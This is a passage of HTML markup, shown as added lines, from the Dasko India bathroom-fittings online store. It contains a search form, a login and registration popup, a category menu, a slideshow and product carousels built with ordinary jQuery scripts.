+<form id="search_mini_form_mobile" action="http://daskoindia.com/catalogsearch/result/" method="get">
+    <div class="form-search clearfix">
+        <input id="search_mobile" type="text" name="q" value="" class="input-text" maxlength="128" />
+        <button type="submit" title="Search" class="button"><span><span class="fa fa-search"></span></span></button>
+        <div id="search_autocomplete_mobile" class="search-autocomplete"></div>
+        <script type="text/javascript">
+        //<![CDATA[
+            var searchForm = new Varien.searchForm('search_mini_form_mobile', 'search_mobile', 'Find it here...');
+            searchForm.initAutocomplete('http://daskoindia.com/catalogsearch/ajax/suggest/', 'search_autocomplete_mobile');
+        //]]>
+        </script>
+    </div>
+</form>
+</div>
+</div>
+            
+
+<script type="text/javascript">
+//<![CDATA[
+    var headerType = 4;
+//]]>
+</script>
+            <div class="main-container col1-layout">
+                <div class="main-before-top-container"></div>
+                <div class="main container">
+                                        <div class="preface"></div>
+                    <div class="col-main">
+                        <div class="clearfix"></div>
+                                                <div class="header-ajaxlr-container">
+    <div class="eg-ajaxlogin-loader">
+    </div>
+
+    <div class="eg-login-window">
+        <div class="eg-window-outside">
+            <!-- <span class="close">×</span> -->
+
+            <div class="eg-window-inside">
+                <div class="eg-window-title">
+                    <h2 class="r-separator">
+                        <span>Login</span>
+                    </h2>
+                </div>
+                
+                <div class="eg-window-box first">
+                    <div class="eg-window-content">
+                        <div class="input-box">
+                            <label for="eg-email-login">E-mail address <span>*</span></label>
+                            <input type="text" id="eg-email-login" class="input-text" name="eg-email" value="" />
+                            <div class="eg-ajaxlogin-error err-email err-noemail err-wrongemail err-wronglogin"></div>
+                        </div>
+                        <div class="input-box">
+                            <label for="eg-password-login">Password <span>*</span></label>
+                            <input type="password" id="eg-password-login" class="input-text" name="eg-password" value="" />
+                            <div class="eg-ajaxlogin-error err-password err-dirtypassword err-nopassword err-longpassword"></div>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="eg-window-box last">
+                    <div class="eg-window-content">
+                        <button type="button" class="button eg-ajaxlogin-button">
+                            <span>
+                                <span>
+                                    Login                                </span>
+                            </span>
+                        </button>
+                        <span class="grid12-6 no-padding eg-forgot-password">
+                            <a href="http://daskoindia.com/customer/account/forgotpassword/">Forgot Password</a>
+                        </span>
+                        <p id="switch-to-register" class="grid12-6 no-padding eg-switch-window">
+                            Register                        </p>
+                    </div>
+                </div>
+                
+            </div>
+        </div>
+    </div>
+
+    <div class="eg-register-window">
+        <div class="eg-window-outside">
+            <!-- <span class="close">×</span> -->
+
+            <div class="eg-window-inside">
+                <div class="eg-window-title">
+                    <h2 class="r-separator">
+                        <span>Registration</span>
+                    </h2>
+                </div>
+
+                <div class="eg-window-box first">
+                    <div class="eg-window-content">
+                        <div class="input-box">
+                            <label for="eg-firstname">First Name <span>*</span></label>
+                            <input type="text" class="input-text" id="eg-firstname" name="eg-firstname" value="" />
+                            <div class="eg-ajaxlogin-error err-firstname err-nofirstname err-dirtyfirstname"></div>
+                        </div>
+                        <div class="input-box">
+                            <label for="eg-lastname">Last Name <span>*</span></label>
+                            <input type="text" class="input-text" id="eg-lastname" name="eg-lastname" value="" />
+                            <div class="eg-ajaxlogin-error err-lastname err-nolastname err-dirtylastname"></div>
+                        </div>
+                        <div class="input-box input-checkbox">
+                            <input type="checkbox" id="eg-newsletter" name="eg-newsletter" value="ok" />
+                            <label for="eg-newsletter">Subscribe to Newsletter</label>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="eg-window-box second">
+                    <div class="eg-window-content">
+                        <div class="input-box">
+                            <label for="eg-email">E-mail address <span>*</span></label>
+                            <input type="text" class="input-text" id="eg-email" name="eg-email" value="" />
+                            <div class="eg-ajaxlogin-error err-email err-noemail err-wrongemail err-emailisexist"></div>
+                        </div>
+                        <div class="input-box">
+                            <label for="eg-password">Password <span>*</span></label>
+                            <input type="password" class="input-text" id="eg-password" name="eg-password" value="" />
+                            <div class="eg-ajaxlogin-error err-password err-dirtypassword err-nopassword err-shortpassword err-longpassword"></div>
+                        </div>
+                        <div class="input-box">
+                            <label for="eg-passwordsecond">Password confirmation <span>*</span></label>
+                            <input type="password" class="input-text" id="eg-passwordsecond" name="eg-passwordsecond" value="" />
+                            <div class="eg-ajaxlogin-error err-passwordsecond err-nopasswordsecond err-notsamepasswords"></div>
+                        </div>
+                        <div class="input-box input-checkbox">
+                            <input type="checkbox" id="eg-licence" name="eg-licence" value="ok" />
+                            <label for="eg-licence">I accept the <a href="#" target="_blank">Terms and Coditions</a></label>
+                            <div class="eg-ajaxlogin-error err-nolicence"></div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="eg-window-box last">
+                    <div class="eg-window-content">
+                        <button type="button" class="button eg-ajaxlogin-button">
+                            <span>
+                                <span>
+                                    Register                                </span>
+                            </span>
+                        </button>
+                        <p id="switch-to-login" class="no-padding eg-switch-window">
+                            Login                        </p>
+                    </div>
+                </div>
+
+            </div>
+        </div>
+    </div>
+
+    <script type="text/javascript">
+    //<![CDATA[
+        jQuery(function($) {
+            $.fn.egAjaxLogin({
+                redirection : '0',
+                profileUrl : 'http://daskoindia.com/customer/account/',
+                controllerUrl : 'http://daskoindia.com/egajax/account/index/',
+                errorMessages : {"nofirstname":"First name is required!","nolastname":"Last name is required!","dirtyfirstname":"First name is not valid!","dirtylastname":"Last name is not valid!","wrongemail":"This is not an email address!","noemail":"Email address is required!","emailisexist":"This email is already registered!","nopassword":"Password is required!","dirtypassword":"Enter a valid password!","shortpassword":"Please enter 6 or more characters!","longpassword":"Please enter 16 or less characters!","notsamepasswords":"Passwords are not same!","nolicence":"Terms and Conditions are required!","wronglogin":"Email or Password is wrong!"},
+                offsetLeft : 0,
+                offsetTop : 23,
+                parentElem : '.header-container',
+                elemWrapper : '.header-ajaxlr-container',
+                elemLogin : 'a[href*="customer/account/login"]',
+                elemReg : 'a[href*="customer/account/create"]',
+                elemOther : ''
+            });
+        });
+    //]]>
+    </script>
+</div>
+<div id="eg-ajaxcart-bglayer" class="eg-ajax-bglayer"></div>
+<div id="eg-ajaxcart-success" class="border-block eg-ajax-success-msg">
+	<div class="success-msg-container">
+		<p class="msg-content">Product was successfully added to your shopping cart.</p>
+		<p class="timer theme-color" data-time="5">5</p>
+		<button type="button" name="eg-ajaxcart-continue" id="eg-ajaxcart-continue" class="button btn-continue btn-grey">
+			<span><span>Continue Shopping</span></span>
+		</button>
+		<button type="button" name="eg-ajaxcart-checkout" id="eg-ajaxcart-checkout" class="button btn-checkout">
+			<span><span>Checkout</span></span>
+		</button>
+    </div>
+</div>	
+<script type="text/javascript">
+	jQuery('#eg-ajaxcart-checkout').click(function() {
+		location.href = "http://daskoindia.com/checkout/onepage/";
+	});
+
+	jQuery('#eg-ajaxcart-continue').click(function() {
+		jQuery('#eg-ajaxcart-success').fadeOut(200);
+		jQuery('#eg-ajaxcart-bglayer').fadeOut(200);
+	}); 
+</script>
+
+
+<div class="std"><div class="slider-section" style="margin-top:-15px;margin-bottom:30px;">
+    <div class="grid-container">
+        <div class="grid12-3 grid-xs-hide grid-sm-hide">
+            <div class="home-sidecategory sidecategory2 theme-bd-color">
+    <div class="block-title eg-ttu">
+        <h4 class="eg-fwn">Shop By Categories</h4>
+    </div>
+    <div class="clearfix"></div>
+    <div class="block-content eg-ttu">
+        <div class="category-vmenu-wrapper">
+            <ul class="category-vmenu">
+                <li class="level0"><a class="level0" href="http://daskoindia.com/about-us.html"><span>About us</span></a></li><li class="level0 parent"><a class="level0" href="http://daskoindia.com/products.html"><span>Products</span></a><span class="opener theme-color"><span class="fa fa-caret-right"></span></span><ul class="level0 parent theme-bd-color clearfix"><li class="level1 parent"><a class="level1" href="http://daskoindia.com/products/faucet.html"><span>Faucet</span></a><span class="opener theme-color"><span class="fa fa-caret-right"></span></span><ul class="level1 parent theme-bd-color clearfix"><li class="level2"><a class="level2" href="http://daskoindia.com/products/faucet/bibcock.html"><span>Bibcock</span></a></li><li class="level2"><a class="level2" href="http://daskoindia.com/products/faucet/long-body.html"><span>Long Body</span></a></li><li class="level2"><a class="level2" href="http://daskoindia.com/products/faucet/pillarcock.html"><span>Pillarcock</span></a></li><li class="level2"><a class="level2" href="http://daskoindia.com/products/faucet/swan-neck.html"><span>CH &amp; Sink Mixer</span></a></li><li class="level2"><a class="level2" href="http://daskoindia.com/products/faucet/hot-cold-mixers.html"><span>Hot &amp; Cold Mixers</span></a></li></ul></li><li class="level1 parent"><a class="level1" href="http://daskoindia.com/products/shower.html"><span>Shower</span></a><span class="opener theme-color"><span class="fa fa-caret-right"></span></span><ul class="level1 parent theme-bd-color clearfix"><li class="level2"><a class="level2" href="http://daskoindia.com/products/shower/band-showers.html"><span>Band Showers</span></a></li><li class="level2"><a class="level2" href="http://daskoindia.com/products/shower/over-head-swowers.html"><span>Over Head Swowers</span></a></li><li class="level2"><a class="level2" href="http://daskoindia.com/products/shower/sandwich-ultra-thin.html"><span>Sandwich &amp; Ultra Thin</span></a></li><li class="level2"><a class="level2" href="http://daskoindia.com/products/shower/telephone-showers.html"><span>Telephone Showers</span></a></li><li class="level2"><a class="level2" href="http://daskoindia.com/products/shower/tube-shower.html"><span>Shower Tube </span></a></li></ul></li><li class="level1 parent"><a class="level1" href="http://daskoindia.com/products/fitings.html"><span>Fitings</span></a><span class="opener theme-color"><span class="fa fa-caret-right"></span></span><ul class="level1 parent theme-bd-color clearfix"><li class="level2"><a class="level2" href="http://daskoindia.com/products/fitings/angle-valve.html"><span>Angle Valve &amp; Phase Bib Disc</span></a></li><li class="level2"><a class="level2" href="http://daskoindia.com/products/fitings/anti-cockroch-jali-drain-jali.html"><span>Anti Cockroch Jali &amp; Grating</span></a></li><li class="level2"><a class="level2" href="http://daskoindia.com/products/fitings/bib-disc-cp-bottle-trap.html"><span>CP Bottle Trap &amp; Waste Pipe</span></a></li><li class="level2"><a class="level2" href="http://daskoindia.com/products/fitings/connection-tubes-shawer-tubes.html"><span>Connection Tubes &amp; Shawer Tubes</span></a></li><li class="level2"><a class="level2" href="http://daskoindia.com/products/fitings/cp-concealed-waste-pipe.html"><span>CP Concealed &amp; Deviator</span></a></li><li class="level2"><a class="level2" href="http://daskoindia.com/products/fitings/cp-waster-coupling-sink-coupling.html"><span>CP Waster Coupling &amp; Sink Coupling</span></a></li><li class="level2"><a class="level2" href="http://daskoindia.com/products/fitings/ext-nipple-flanges.html"><span>Ext. Nipple &amp; Flanges</span></a></li><li class="level2"><a class="level2" href="http://daskoindia.com/products/fitings/health-faucets-jet-spay.html"><span>Health Faucets &amp; Jet Spay</span></a></li><li class="level2"><a class="level2" href="http://daskoindia.com/products/fitings/shawer-arms.html"><span>Shawer Arms</span></a></li></ul></li><li class="level1 parent"><a class="level1" href="http://daskoindia.com/products/accessories.html"><span>Accessories</span></a><span class="opener theme-color"><span class="fa fa-caret-right"></span></span><ul class="level1 parent theme-bd-color clearfix"><li class="level2"><a class="level2" href="http://daskoindia.com/products/accessories/cp-bath-set.html"><span>CP bath Set</span></a></li><li class="level2"><a class="level2" href="http://daskoindia.com/products/accessories/paper-holder.html"><span>Paper Holder</span></a></li><li class="level2"><a class="level2" href="http://daskoindia.com/products/accessories/rob-hook.html"><span>Rob Hook</span></a></li><li class="level2"><a class="level2" href="http://daskoindia.com/products/accessories/shelfs-corners.html"><span>Shelf &amp; Corners</span></a></li><li class="level2"><a class="level2" href="http://daskoindia.com/products/accessories/soap-dish.html"><span>Soap Dish</span></a></li><li class="level2"><a class="level2" href="http://daskoindia.com/products/accessories/towel-hanger.html"><span>Towel Hanger</span></a></li><li class="level2"><a class="level2" href="http://daskoindia.com/products/accessories/towel-rack.html"><span>Towel Rack</span></a></li><li class="level2"><a class="level2" href="http://daskoindia.com/products/accessories/towel-rod.html"><span>Towel Rod</span></a></li><li class="level2"><a class="level2" href="http://daskoindia.com/products/accessories/tumler-holder.html"><span>Tumbler Holder</span></a></li></ul></li></ul></li><li class="level0"><a class="level0" href="http://daskoindia.com/new-arrivals.html"><span>New Arrivals</span></a></li><li class="level0"><a class="level0" href="http://daskoindia.com/contact-us.html"><span>Contact Us</span></a></li>            </ul>
+        </div>
+    </div>
+</div>
+
+        </div>
+
+        <div class="grid12-9 grid-xs-full grid-sm-full">
+            <div class="home-egslideshow-wrapper">
+    <div class="home-egslideshow">
+        <div id="slider-wrapper" class="slides owl-carousel" style="width:100%;">
+                                    <div class="item slide">
+                    <div class="block-slide owlslider-block block-slide1 eg-fcf">
+    <img src="http://daskoindia.com/media/wysiwyg/elegento/slideshow/home-slide01.jpg" alt="" />
+    <!--<div class="block-banner banner a-center">
+        <div class="banner-inner" style="left:10%;width:50%;">
+            <h5 class="">PIXEL PERFECT DESIGN</h5>
+            <div class="horizontal-separator separator-1 grid12-xs-hide" style="margin: 20px auto;">&nbsp;</div>
+            <h2 class="">JEWELLERY</h2>
+            <h3 class="">SPRING 2015</h3>
+            <div class="horizontal-separator separator-1 grid12-xs-hide" style="margin: 20px auto;">&nbsp;</div>
+            <p>The season of warm wear and easy living has arrived.</p>
+            <div class="buttons-set eg-ttu">
+                <a href="#" class="button btn-shop btn-link"><span>Shop Now</span></a>
+                <a href="#" class="button btn-feature btn-link"><span>Feature</span></a>
+            </div>
+        </div>
+    </div>-->
+</div>                </div>
+                                                <div class="item slide">
+                    <div class="block-slide owlslider-block block-slide2 eg-fcf">
+    <img src="http://daskoindia.com/media/wysiwyg/elegento/slideshow/home-slide02.jpg" alt="" />
+    <!--<div class="block-banner banner a-center">
+        <div class="banner-inner" style="left:40%;width:50%;">
+            <h5 class="">PIXEL PERFECT DESIGN</h5>
+            <div class="horizontal-separator separator-1 grid12-xs-hide" style="margin: 20px auto;">&nbsp;</div>
+            <h2 class="">JEWELLERY</h2>
+            <h3 class="">SPRING 2015</h3>
+            <div class="horizontal-separator separator-1 grid12-xs-hide" style="margin: 20px auto;">&nbsp;</div>
+            <p>The season of warm wear and easy living has arrived.</p>
+            <div class="buttons-set eg-ttu">
+                <a href="#" class="button btn-shop btn-link"><span>Shop Now</span></a>
+                <a href="#" class="button btn-feature btn-link"><span>Feature</span></a>
+            </div>
+        </div>
+    </div>-->
+</div>                </div>
+                                                <div class="item slide">
+                    <div class="block-slide owlslider-block block-slide3 eg-fcf">
+    <img src="http://daskoindia.com/media/wysiwyg/elegento/slideshow/home-slide03.jpg" alt="" />
+   <!--<div class="block-banner banner a-center">
+        <div class="banner-inner" style="left:10%;width:50%;">
+            <h5 class="">PIXEL PERFECT DESIGN</h5>
+            <div class="horizontal-separator separator-1 grid12-xs-hide" style="margin: 20px auto;">&nbsp;</div>
+            <h2 class="">JEWELLERY</h2>
+            <h3 class="">SPRING 2015</h3>
+            <div class="horizontal-separator separator-1 grid12-xs-hide" style="margin: 20px auto;">&nbsp;</div>
+            <p>The season of warm wear and easy living has arrived.</p>
+            <div class="buttons-set eg-ttu">
+                <a href="#" class="button btn-shop btn-link"><span>Shop Now</span></a>
+                <a href="#" class="button btn-feature btn-link"><span>Feature</span></a>
+            </div>
+        </div>
+    </div>-->
+</div>                </div>
+                            </div>
+    </div>
+</div>
+
+<script type="text/javascript">
+//<![CDATA[
+    jQuery(document).ready(function($) {
+        
+        var owl = $('#slider-wrapper');
+        owl.owlCarousel({
+
+            singleItem: true,
+
+                    slideSpeed: 600,
+        
+                    autoPlay: false,
+        
+                    stopOnHover: true,
+        
+                    rewindNav: true,
+            rewindSpeed: 600,
+        
+                    autoHeight: false,
+        
+                    transitionStyle: 'fade',
+                    navigationText: ["<span class='fa fa-angle-left'></span>", "<span class='fa fa-angle-right'></span>"],
+            navigation: true
+
+        });
+
+    });
+//]]>
+</script>
+
+        </div>
+    </div>
+</div>
+
+<div class="grid-container eg-homeblock">
+    <div class="banner-section banner-section-1 clearfix eg-tac eg-fcf eg-ttu">
+    <div class="banner-column-wrapper grid12-8 grid-xs-full">
+        <div class="banner-column">
+            <div class="banner-column-top">
+                <div class="banner">
+                    <img src="http://daskoindia.com/media/wysiwyg/elegento/banner/banner1/banner1-left-top.jpg" alt="" />
+                </div> 
+            </div>
+            <div class="grid-container">
+                <div class="grid12-6 grid-xs-full">
+                    <div class="banner-wrapper">
+                        <div class="banner eg-hoverzoom eg-hoveropacity eg-hover1 banner-video">
+                            
+                            <img src="http://daskoindia.com/media/wysiwyg/elegento/banner/banner1/banner1-left-bottom-left.jpg" alt="" />
+                        </div> 
+                    </div> 
+                </div> 
+
+                <div class="grid12-6 grid-xs-full">
+                    <div class="banner-wrapper">
+                        <div class="banner eg-hoverzoom eg-hoveropacity eg-hover1" onclick="window.location = '#'">
+                          
+                            <img src="http://daskoindia.com/media/wysiwyg/elegento/banner/banner1/banner1-left-bottom-right.jpg" alt="" />
+                        </div>
+                    </div> 
+                </div> 
+            </div>
+        </div> 
+    </div> 
+
+    <div class="banner-column-wrapper grid12-4 grid-xs-full">
+        <div class="banner-column">
+            <div class="banner eg-hoverzoom eg-hoveropacity eg-hover1" onclick="window.location = '#'">
+                
+                <img src="http://daskoindia.com/media/wysiwyg/elegento/banner/banner1/banner1-right.jpg" alt="" />
+            </div>
+        </div> 
+    </div> 
+</div>
+</div>
+
+
+
+<div class="grid-container eg-homeblock">
+    
+
+                        
+<div class="tab-section tabbable">
+    <div class="nav-tabs-container"><ul id="tabs" class="nav nav-tabs" data-tabs="tabs"><li class=" active"><a href="#featured" data-toggle="tab">FEATURED</a></li><li class=""><a href="#most_viewed" data-toggle="tab">MOST FAVORITE</a></li></ul></div><div id="tab-content" class="tab-content"><div class="tab-pane clearfix active" id="featured"><div class="panel"><div class="clearfix"></div>
+<div class="product-list-slider eg-slidertype2">
+    <div class="product-list-0e9bf50418157cf3b1a3cd1b8802cbec owl-carousel">
+                    <div class="column-item clearfix">
+                    <div class="item clearfix">
+                <div class="media-section ">
+                    <!--<a href="http://daskoindia.com/bc001-1902.html" title="HCTM002" class="product-image" data-images="">-->
+                        <img src="http://daskoindia.com/media/catalog/product/cache/1/small_image/350x455/9df78eab33525d08d6e5fb8d27136e95/h/c/hctm002.jpg" alt="HCTM002" style="width:100%" width="350" height="455" />
+                                                                                                <!--</a>-->
+                    <div class="product-labels">
+                                                                                                                    </div>                
+                    <div class="hover-section">
+                        <div class="hover-links-wrapper a-center">
+                                                                                                </div>
+                    </div>
+                </div>
+                <div class="details-section">
+                                        <h2 class="product-name">
+                        <!--<a href="" title="">-->HCTM002<!--</a>-->
+                    </h2>
+                    <!--<div class="review rating-only">
+                                            </div>-->
+                                        <!--<div class="actions">
+                                                                                    <div class="add-to-bag">
+                                    <button type="button" title="BOOK NOW" class="button btn-cart btn-link" onclick="EGAjaxObject.ajaxCart('http://daskoindia.com/checkout/cart/add/uenc/aHR0cDovL2Rhc2tvaW5kaWEuY29tLw,,/product/1109/form_key/0AFTDYOd13z0XaJW/')"><span><span>BOOK NOW</span></span></button>
+                                </div>
+                                                                        </div>-->
+                </div>
+            </div>
+                </div>
+                            <div class="column-item clearfix">
+                    <div class="item clearfix">
+                <div class="media-section ">
+                    <!--<a href="http://daskoindia.com/bc001-1901.html" title="HCTM001" class="product-image" data-images="">-->
+                        <img src="http://daskoindia.com/media/catalog/product/cache/1/small_image/350x455/9df78eab33525d08d6e5fb8d27136e95/h/c/hctm001_2.jpg" alt="HCTM001" style="width:100%" width="350" height="455" />
+                                                                                                <!--</a>-->
+                    <div class="product-labels">
+                                                                                                                    </div>                
+                    <div class="hover-section">
+                        <div class="hover-links-wrapper a-center">
+                                                                                                </div>
+                    </div>
+                </div>
+                <div class="details-section">
+                                        <h2 class="product-name">
+                        <!--<a href="" title="">-->HCTM001<!--</a>-->
+                    </h2>
+                    <!--<div class="review rating-only">
+                                            </div>-->
+                                        <!--<div class="actions">
+                                                                                    <div class="add-to-bag">
+                                    <button type="button" title="BOOK NOW" class="button btn-cart btn-link" onclick="EGAjaxObject.ajaxCart('http://daskoindia.com/checkout/cart/add/uenc/aHR0cDovL2Rhc2tvaW5kaWEuY29tLw,,/product/1108/form_key/0AFTDYOd13z0XaJW/')"><span><span>BOOK NOW</span></span></button>
+                                </div>
+                                                                        </div>-->
+                </div>
+            </div>
+                </div>
+                            <div class="column-item clearfix">
+                    <div class="item clearfix">
+                <div class="media-section ">
+                    <!--<a href="http://daskoindia.com/bc001-1900.html" title="HCBM006" class="product-image" data-images="">-->
+                        <img src="http://daskoindia.com/media/catalog/product/cache/1/small_image/350x455/9df78eab33525d08d6e5fb8d27136e95/h/c/hcbm006.jpg" alt="HCBM006" style="width:100%" width="350" height="455" />
+                                                                                                <!--</a>-->
+                    <div class="product-labels">
+                                                                                                                    </div>                
+                    <div class="hover-section">
+                        <div class="hover-links-wrapper a-center">
+                                                                                                </div>
+                    </div>
+                </div>
+                <div class="details-section">
+                                        <h2 class="product-name">
+                        <!--<a href="" title="">-->HCBM006<!--</a>-->
+                    </h2>
+                    <!--<div class="review rating-only">
+                                            </div>-->
+                                        <!--<div class="actions">
+                                                                                    <div class="add-to-bag">
+                                    <button type="button" title="BOOK NOW" class="button btn-cart btn-link" onclick="EGAjaxObject.ajaxCart('http://daskoindia.com/checkout/cart/add/uenc/aHR0cDovL2Rhc2tvaW5kaWEuY29tLw,,/product/1106/form_key/0AFTDYOd13z0XaJW/')"><span><span>BOOK NOW</span></span></button>
+                                </div>
+                                                                        </div>-->
+                </div>
+            </div>
+                </div>
+                            <div class="column-item clearfix">
+                    <div class="item clearfix">
+                <div class="media-section ">
+                    <!--<a href="http://daskoindia.com/bc001-1899.html" title="HCBM005" class="product-image" data-images="">-->
+                        <img src="http://daskoindia.com/media/catalog/product/cache/1/small_image/350x455/9df78eab33525d08d6e5fb8d27136e95/h/c/hcbm005_1.jpg" alt="HCBM005" style="width:100%" width="350" height="455" />
+                                                                                                <!--</a>-->
+                    <div class="product-labels">
+                                                                                                                    </div>                
+                    <div class="hover-section">
+                        <div class="hover-links-wrapper a-center">
+                                                                                                </div>
+                    </div>
+                </div>
+                <div class="details-section">
+                                        <h2 class="product-name">
+                        <!--<a href="" title="">-->HCBM005<!--</a>-->
+                    </h2>
+                    <!--<div class="review rating-only">
+                                            </div>-->
+                                        <!--<div class="actions">
+                                                                                    <div class="add-to-bag">
+                                    <button type="button" title="BOOK NOW" class="button btn-cart btn-link" onclick="EGAjaxObject.ajaxCart('http://daskoindia.com/checkout/cart/add/uenc/aHR0cDovL2Rhc2tvaW5kaWEuY29tLw,,/product/1105/form_key/0AFTDYOd13z0XaJW/')"><span><span>BOOK NOW</span></span></button>
+                                </div>
+                                                                        </div>-->
+                </div>
+            </div>
+                </div>
+                            <div class="column-item clearfix">
+                    <div class="item clearfix">
+                <div class="media-section ">
+                    <!--<a href="http://daskoindia.com/bc001-1898.html" title="HCBM004" class="product-image" data-images="">-->
+                        <img src="http://daskoindia.com/media/catalog/product/cache/1/small_image/350x455/9df78eab33525d08d6e5fb8d27136e95/h/c/hcbm004.jpg" alt="HCBM004" style="width:100%" width="350" height="455" />
+                                                                                                <!--</a>-->
+                    <div class="product-labels">
+                                                                                                                    </div>                
+                    <div class="hover-section">
+                        <div class="hover-links-wrapper a-center">
+                                                                                                </div>
+                    </div>
+                </div>
+                <div class="details-section">
+                                        <h2 class="product-name">
+                        <!--<a href="" title="">-->HCBM004<!--</a>-->
+                    </h2>
+                    <!--<div class="review rating-only">
+                                            </div>-->
+                                        <!--<div class="actions">
+                                                                                    <div class="add-to-bag">
+                                    <button type="button" title="BOOK NOW" class="button btn-cart btn-link" onclick="EGAjaxObject.ajaxCart('http://daskoindia.com/checkout/cart/add/uenc/aHR0cDovL2Rhc2tvaW5kaWEuY29tLw,,/product/1104/form_key/0AFTDYOd13z0XaJW/')"><span><span>BOOK NOW</span></span></button>
+                                </div>
+                                                                        </div>-->
+                </div>
+            </div>
+                </div>
+                            <div class="column-item clearfix">
+                    <div class="item clearfix">
+                <div class="media-section ">
+                    <!--<a href="http://daskoindia.com/bc001-1897.html" title="HCBM003" class="product-image" data-images="">-->
+                        <img src="http://daskoindia.com/media/catalog/product/cache/1/small_image/350x455/9df78eab33525d08d6e5fb8d27136e95/h/c/hcbm003.jpg" alt="HCBM003" style="width:100%" width="350" height="455" />
+                                                                                                <!--</a>-->
+                    <div class="product-labels">
+                                                                                                                    </div>                
+                    <div class="hover-section">
+                        <div class="hover-links-wrapper a-center">
+                                                                                                </div>
+                    </div>
+                </div>
+                <div class="details-section">
+                                        <h2 class="product-name">
+                        <!--<a href="" title="">-->HCBM003<!--</a>-->
+                    </h2>
+                    <!--<div class="review rating-only">
+                                            </div>-->
+                                        <!--<div class="actions">
+                                                                                    <div class="add-to-bag">
+                                    <button type="button" title="BOOK NOW" class="button btn-cart btn-link" onclick="EGAjaxObject.ajaxCart('http://daskoindia.com/checkout/cart/add/uenc/aHR0cDovL2Rhc2tvaW5kaWEuY29tLw,,/product/1103/form_key/0AFTDYOd13z0XaJW/')"><span><span>BOOK NOW</span></span></button>
+                                </div>
+                                                                        </div>-->
+                </div>
+            </div>
+                </div>
+                            <div class="column-item clearfix">
+                    <div class="item clearfix">
+                <div class="media-section ">
+                    <!--<a href="http://daskoindia.com/bc001-1896.html" title="SC002" class="product-image" data-images="">-->
+                        <img src="http://daskoindia.com/media/catalog/product/cache/1/small_image/350x455/9df78eab33525d08d6e5fb8d27136e95/s/c/sc002.jpg" alt="SC002" style="width:100%" width="350" height="455" />
+                                                                                                <!--</a>-->
+                    <div class="product-labels">
+                                                                                                                    </div>                
+                    <div class="hover-section">
+                        <div class="hover-links-wrapper a-center">
+                                                                                                </div>
+                    </div>
+                </div>
+                <div class="details-section">
+                                        <h2 class="product-name">
+                        <!--<a href="" title="">-->SC002<!--</a>-->
+                    </h2>
+                    <!--<div class="review rating-only">
+                                            </div>-->
+                                        <!--<div class="actions">
+                                                                                    <div class="add-to-bag">
+                                    <button type="button" title="BOOK NOW" class="button btn-cart btn-link" onclick="EGAjaxObject.ajaxCart('http://daskoindia.com/checkout/cart/add/uenc/aHR0cDovL2Rhc2tvaW5kaWEuY29tLw,,/product/1102/form_key/0AFTDYOd13z0XaJW/')"><span><span>BOOK NOW</span></span></button>
+                                </div>
+                                                                        </div>-->
+                </div>
+            </div>
+                </div>
+                            <div class="column-item clearfix">
+                    <div class="item clearfix">
+                <div class="media-section ">
+                    <!--<a href="http://daskoindia.com/bc001-1895.html" title="SC001" class="product-image" data-images="">-->
+                        <img src="http://daskoindia.com/media/catalog/product/cache/1/small_image/350x455/9df78eab33525d08d6e5fb8d27136e95/s/c/sc001.jpg" alt="SC001" style="width:100%" width="350" height="455" />
+                                                                                                <!--</a>-->
+                    <div class="product-labels">
+                                                                                                                    </div>                
+                    <div class="hover-section">
+                        <div class="hover-links-wrapper a-center">
+                                                                                                </div>
+                    </div>
+                </div>
+                <div class="details-section">
+                                        <h2 class="product-name">
+                        <!--<a href="" title="">-->SC001<!--</a>-->
+                    </h2>
+                    <!--<div class="review rating-only">
+                                            </div>-->
+                                        <!--<div class="actions">
+                                                                                    <div class="add-to-bag">
+                                    <button type="button" title="BOOK NOW" class="button btn-cart btn-link" onclick="EGAjaxObject.ajaxCart('http://daskoindia.com/checkout/cart/add/uenc/aHR0cDovL2Rhc2tvaW5kaWEuY29tLw,,/product/1101/form_key/0AFTDYOd13z0XaJW/')"><span><span>BOOK NOW</span></span></button>
+                                </div>
+                                                                        </div>-->
+                </div>
+            </div>
+                </div>
+                </div>
+</div>
+<script type="text/javascript">
+//<![CDATA[
+jQuery(function($) {
+    var dynamicVar = 'product-list-0e9bf50418157cf3b1a3cd1b8802cbec';
+    var owlVar = dynamicVar.replace('-', '');
+    window[owlVar] = $(".product-list-0e9bf50418157cf3b1a3cd1b8802cbec");
+    window[owlVar].owlCarousel({
+        navigation: true,
+        lazyLoad: true,
+        autoPlay: false,
+        autoHeight: false,
+        itemsCustom: [[0,1], [320,1], [480,1], [751,3], [960,3], [1263,4]],
+        pagination: false,
+        rewindNav: true,
+        rewindSpeed: 600,
+        transitionStyle: 'fade',
+        navigationText: ["<span class='fa fa-angle-left'></span>", "<span class='fa fa-angle-right'></span>"]
+    });
+});
+//]]
+</script>
+</div></div><div class="tab-pane clearfix" id="most_viewed"><div class="panel"><div class="clearfix"></div>
+<div class="product-list-slider eg-slidertype2">
+    <div class="product-list-ce26732511a2591a100d82cf922561ef owl-carousel">
+                    <div class="column-item clearfix">
+                    <div class="item clearfix">
+                <div class="media-section ">
+                    <!--<a href="http://daskoindia.com/bc001-1770.html" title="RUS002" class="product-image" data-images="">-->
+                        <img src="http://daskoindia.com/media/catalog/product/cache/1/small_image/350x455/9df78eab33525d08d6e5fb8d27136e95/r/u/rus002.jpg" alt="RUS002" style="width:100%" width="350" height="455" />
+                                                                                                <!--</a>-->
+                    <div class="product-labels">
+                                                                                                                    </div>                
+                    <div class="hover-section">
+                        <div class="hover-links-wrapper a-center">
+                                                                                                </div>
+                    </div>
+                </div>
+                <div class="details-section">
+                                        <h2 class="product-name">
+                        <!--<a href="" title="">-->RUS002<!--</a>-->
+                    </h2>
+                    <!--<div class="review rating-only">
+                                            </div>-->
+                                        <!--<div class="actions">
+                                                                                    <div class="add-to-bag">
+                                    <button type="button" title="BOOK NOW" class="button btn-cart btn-link" onclick="EGAjaxObject.ajaxCart('http://daskoindia.com/checkout/cart/add/uenc/aHR0cDovL2Rhc2tvaW5kaWEuY29tLw,,/product/974/form_key/0AFTDYOd13z0XaJW/')"><span><span>BOOK NOW</span></span></button>
+                                </div>
+                                                                        </div>-->
+                </div>
+            </div>
+                </div>
+                            <div class="column-item clearfix">
+                    <div class="item clearfix">
+                <div class="media-section ">
+                    <!--<a href="http://daskoindia.com/bc001-1771.html" title="SSS001" class="product-image" data-images="">-->
